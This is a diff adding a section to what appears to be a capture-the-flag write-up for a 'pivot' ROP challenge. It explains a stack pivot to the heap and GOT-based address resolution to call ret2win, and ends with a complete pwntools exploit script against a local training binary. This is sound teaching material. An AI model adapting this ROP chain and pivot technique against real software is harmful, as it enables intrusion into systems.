@@ -379,3 +379,146 @@ Result:
   execution to the address in the register.
 - To call `ret2win` we modify the address to be `foothold_function@got.plt -
   0x096a + 0x0a81`
+
+We still need to pivot the stack, the logic for this is the same as it was in
+the other solutions.
+
+```python
+stack_payload  = b'A'*40
+# Move stack to the heap
+stack_payload += p64(pop_rsp)
+stack_payload += p64(heap_address)
+# Values are now being pop'ed from the heap memory
+```
+
+We resolve the `foothold_function` by calling it's `@plt`, then we load the
+`.got.plt` table pointer into the $rax register.
+Using a `mov (%rax),%rax` gadget, we dereference the pointer, yielding us the
+resolved address, which is stored into $rax.
+
+```python
+heap_payload  = p64(0x13) + p64(0x14) + p64(0x15)
+# Resolve foothold by calling it
+heap_payload += p64(foothold_plt)
+# Load foothold@got into $rax register
+heap_payload += p64(pop_rax)
+heap_payload += p64(foothold_got)
+heap_payload += p64(mov_rax)
+```
+
+Because we actually have the `libpivot.so` binary, we now the offsets
+of the `foothold_function` and `ret2win`, so we just have to add the difference
+to $rax.
+
+```python
+win_offset_from_foothold = libelf.sym['ret2win'] - libelf.sym['foothold_function']
+```
+
+```python
+heap_payload += p64(pop_rbp)
+heap_payload += p64(win_offset_from_foothold)
+heap_payload += p64(add_rbp_rax)
+```
+
+`pwmtools` is rather disappointing when it comes to finding ROP gadgets, but so
+was `radare2` which is usually better at this.
+Luckily, with `ROPgadget` I discovered a great gadget:
+
+```sh
+ROPgadget --binary ./pivot --filter 'and|add'
+Gadgets information
+# ============================================================
+# ... SNIP: bunch of other gadgets ..
+# Exactly what we need:
+# 0x00000000004006b0 : call rax
+```
+
+So the only thing that's left to do is calling the function whose address we
+already have in $rax.
+
+```python3
+heap_payload += p64(call_rax)
+```
+
+<details>
+
+<summary>The full exploit script</summary>
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context.bits = 64
+context.arch = 'amd64'
+
+process_name = './pivot'
+library_name = './libpivot.so'
+elf = ELF(process_name)
+libelf = ELF(library_name)
+rop = ROP(elf)
+
+DEBUG = False
+DEBUG_ARGS = '''
+# at ret of pwnme
+b *pwnme+182
+# usefulGadgets
+b *0x4009bb
+'''
+
+if DEBUG:
+    p = gdb.debug(process_name, DEBUG_ARGS)
+else:
+    p = process(process_name)
+
+foothold_plt = elf.plt['foothold_function']
+foothold_got = elf.got['foothold_function']
+# distance between foothold and ret2win =  0xA81 - 0x96A
+win_offset_from_foothold = libelf.sym['ret2win'] - libelf.sym['foothold_function']
+
+pop_rsp = rop.find_gadget(['pop rsp'])[0] # followed by pop r13, r14, and r15!!
+pop_rax = rop.rax.address # 0x4009bb, equivalent to: rop.find_gadget(['pop rax', 'ret'])[0]
+mov_rax = 0x004009c0      # apparently, ROP() doesn't know any gadgets starting with `mov`, so we have to hard code it.
+pop_rbp = rop.rbp.address # 0x4007c8
+add_rbp_rax = 0x004009c4
+call_rax = 0x004006b0
+
+# ** Parse heap address
+p.recvuntil(b'place to pivot: ')
+heap_address = p.recvuntil(b'Send a ROP')
+heap_address = heap_address.replace(b'\nSend a ROP', b'')
+heap_address = int(heap_address, 16)
+info('READ HEAP ADDRESS: %s' % hex(heap_address))
+
+# ** Input heap payload
+heap_payload  = p64(0x13) + p64(0x14) + p64(0x15)
+# 1. Resolve foothold by calling it
+heap_payload += p64(foothold_plt)
+# 2. Load foothold@got into $rax register
+heap_payload += p64(pop_rax)
+heap_payload += p64(foothold_got)
+heap_payload += p64(mov_rax)
+# 3. Add offset for ret2win function to $rax
+heap_payload += p64(pop_rbp)
+heap_payload += p64(win_offset_from_foothold)
+heap_payload += p64(add_rbp_rax)
+# 4. Call the function pointed to by $rax
+heap_payload += p64(call_rax)
+
+assert len(heap_payload) <= 256, "Heap payload must NOT be larger than 256 bytes!"
+p.recvuntil(b'> ')
+p.sendline(heap_payload)
+
+# ** Input stack payload
+stack_payload  = b'A'*40
+# Move stack to the heap
+stack_payload += p64(pop_rsp)
+stack_payload += p64(heap_address)
+# Values are now pop'ed from the heap memory
+
+assert len(stack_payload) <= 64, "Stack payload must NOT be larger than 64 bytes!"
+p.recvuntil(b'> ')
+p.sendline(stack_payload)
+
+p.interactive()
+```
+
+</details>
